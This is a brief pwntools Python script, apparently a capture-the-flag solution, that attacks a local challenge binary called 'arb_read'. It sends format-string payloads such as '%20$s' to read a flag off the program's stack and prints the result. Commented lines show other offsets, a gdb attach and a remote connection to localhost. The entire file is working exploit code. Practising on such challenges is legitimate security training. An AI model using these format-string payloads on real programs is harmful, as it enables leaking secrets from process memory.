from pwn import *

context.binary = './bin/arb_read'


#p = remote('localhost', 1337)
p = process("./bin/arb_read")

#gdb.attach(p, gdbscript="""
#set disassembly-flavor intel
#display/5i $pc
#b vuln
#        """)

# Leak flag on the stack
#p.sendline(b'%21$s')
#flag = p.recvuntil(b"}").split(b" ")[-1:][0].decode('utf-8')
#print(f"Flag: {flag}")



#p.sendline(b'%5$p')
p.sendline(b"%20$s")
p.recvuntil(b'You entered: ')
flag = p.recvline().decode('utf-8')
print(f"Flag: {flag}")
